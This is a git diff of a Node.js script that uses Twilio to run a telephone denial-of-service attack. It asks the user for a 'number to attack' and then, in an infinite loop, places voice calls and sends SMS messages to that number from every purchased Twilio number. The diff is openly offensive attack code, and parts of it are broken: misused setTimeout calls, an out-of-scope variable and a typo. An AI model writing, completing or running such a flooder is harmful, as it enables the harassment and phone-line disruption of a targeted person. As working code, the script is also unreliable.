@@ -10,22 +10,26 @@
 
 /** Basic API logic **/
 
-//using twilio
 
-
-
+// storing API keys and phone numbers in privite file config.js
 var info = require('./config.js');
-var prompts = require('./prompts.js');
-console.log(info);
 
+//strings and prompts stored in file prompts.js
+var prompts = require('./prompts.js');
+
+//text to make sure module.exports is retrieving objects from config.js
+console.log( info );
+
+//API keys and token
 var accountSid = info.MY_KEY;
 var authToken = info.SECREY_KEY;
 
 
-
+//create a twilio client object
 var client = require('twilio')(accountSid, authToken);
 
- 
+
+
 const readline = require('readline');
 
 const read = readline.createInterface({
@@ -33,10 +37,11 @@ const read = readline.createInterface({
   output: process.stdout
 });
 
+// prompt user for number to attack
 var hello = prompts.enterNumber + prompts.numberStart;
 read.question( hello, (answer) => {
 
-  console.log("Number entered: " answer);
+  console.log("Number entered: ", answer);
 
  read.close();
 });
@@ -44,27 +49,49 @@ read.question( hello, (answer) => {
 
 
 
-
-
+// infinite loop phone DoS
 while( true ) { 
 
-	//loop fromNumbers
+	// loop through all the phone numbers purchased on Twilio
+	for ( number in info.phonebook.fromNumbers){
+		
+		// wait three seconds before calling 'Call' function		
+		setTimeout( Call( number ), 3000);
 
-	Call( fromNumber )
-
-	//error handling
-
+		// wait three seconds before calling 'Text' function
+		setTimeout(Text( number ), 3000);
+	}
 
 }
 
+
+/* function used for calling a number with voice message
+ */
 function Call( fromNumber ){
 	client.calls.create({
     	url: "http://demo.twilio.com/docs/voice.xml",
-    	to: answer
-    	from: fromNumber
+    	to: answer,
+    	from: infor
 	}, function(err, call) {
     	process.stdout.write(call.sid);
 	});
 
 }
+/* function used for sms with body message 
+*/
+
+function Text( fromNum ){
+	client.messages.create({
+    	to: answer,
+    	from: fromNum,
+    	body: prompts.bodyMessage
+	}, function(err, call) {
+    	process.stdout.write(call.sid);
+	});
+
+}
+
+
+
+
 
